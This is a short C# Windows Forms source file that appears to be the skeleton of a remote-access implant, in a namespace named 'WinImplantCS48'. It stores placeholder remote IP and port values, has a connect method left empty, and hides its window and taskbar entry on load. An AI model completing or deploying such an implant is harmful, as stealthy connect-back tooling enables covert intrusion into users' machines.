using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinImplantCS48
{
    public partial class frmMain : Form
    {
        private string[] m_args { get; set; }
        private string m_szIPv4 = "[REMOTE_IP]";
        private int m_nPort = int.Parse("[REMOTE_PORT]");

        public frmMain(string[] args)
        {
            InitializeComponent();

            m_args = args;

        }

        void fnConnect()
        {
            if (IPAddress.TryParse(m_szIPv4, out IPAddress ipv4))
            {

            }


        }

        void fnSetup()
        {
            Visible = false;
            MinimizeBox = true;
            ShowInTaskbar = false;


        }

        private void Form1_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
